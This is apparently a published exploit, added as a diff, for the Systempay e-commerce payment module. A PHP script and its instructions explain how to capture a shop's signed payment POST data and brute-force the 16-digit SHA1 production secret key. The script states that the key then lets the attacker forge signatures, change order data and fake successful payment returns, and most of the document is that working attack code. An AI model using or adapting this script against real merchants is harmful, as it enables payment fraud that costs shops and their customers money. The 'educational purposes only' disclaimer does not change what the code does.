@@ -1,0 +1,98 @@
+# Exploit Title: Ecommerce Systempay 1.0 - Production KEY Brute Force
+# Author: live3
+# Date: 2020-02-05
+# Vendor Homepage: https://paiement.systempay.fr/doc/fr-FR/
+# Software Link: https://paiement.systempay.fr/doc/fr-FR/module-de-paiement-gratuit/
+# Tested on: MacOs
+# Version: ALL
+
+<?php
+/**
+ * 
+ * INFORMATION
+ * Exploit Title:        Ecommerce Systempay decode secret production KEY / Brute Force
+ * Author:               live3
+ * Date:                 2020-02-05
+ * Vendor Homepage:      https://paiement.systempay.fr/doc/fr-FR/
+ * Tested on:            MacOs
+ * Version:              ALL
+ * Prerequisite:         Find a ecommerce who is using Systempay AND SHA1 to crypt signature. 
+ * Put some product on cart and choose systempay for payment method.
+ * get all data from post sent to https://paiement.systempay.fr/vads-payment/
+ * keep signature as reference and all vads fields to create new signature.
+ * Use script to make a brute force on Secret product key (16 char length)
+ *
+ * Usage: Once you have the production KEY all modifications on form data will be accepted by systempay ! (You will just generate new signature with your changes)
+ * You will be able to generate a success payment return !
+ *
+ * FOR EDUCATIONAL PURPOSES ONLY. DO NOT USE THIS SCRIPT FOR ILLEGAL ACTIVITIES.
+ * THE AUTHOR IS NOT RESPONSIBLE FOR ANY MISUSE OR DAMAGE.
+ * 
+ */
+
+// Set the start number you want (16 char length)
+$last_key_check = '1000000000000000';
+
+// Assign var
+$array_key = array();
+$sentence = '';
+$how_many_key_to_check_for_loop = 10;
+
+// Put here signature extract from POST DATA
+// Example of SHA1 from string : test
+$signature_from_post = 'a94a8fe5ccb19ba61c4c0873d391e987982fbbd3';
+
+// Copy paste your content decoded of POST DATA
+$form_data = '
+vads_field_1: VALUE1
+vads_field_2: VALUE2
+// AND ALL OTHER FIELDS...
+';
+
+$array = explode(PHP_EOL, $form_data);
+
+foreach ($array as $data) {
+    if ($data != '') {
+        $elements = explode(': ', $data);
+        if (!empty($elements)) {
+            $array_key[trim($elements[0])] = $elements[1];
+        }
+    }
+}
+
+ksort($array_key);
+
+foreach ($array_key as $value) {
+    $sentence .= $value . '+';
+}
+
+
+echo 'Signature from POST DATA : '.$signature_from_post.'<br/>';
+
+$found = false;
+$get_key = '';
+
+// first check
+if (sha1($sentence.$last_key_check) != $signature_from_post) {
+    for ($i = $last_key_check; $i <= $last_key_check+$how_many_key_to_check_for_loop; $i++) {
+        $get_key = $i;
+        if (sha1($sentence.$i) == $signature_from_post) {
+            echo 'Key found : '.$i.'<br/>';
+            $found = true;
+            break;
+        }
+    }
+} else {
+    $found = true;
+}
+
+
+if ($found) {
+    $test_sha = sha1($sentence.$get_key);
+    echo 'Signature calc : '.$test_sha.'<br/><hr/>';
+} else {
+    echo 'Last key check : '.$get_key.'<br/><hr/>';
+}
+
+
+echo 'Your sequence : '.$sentence.'<br/>';
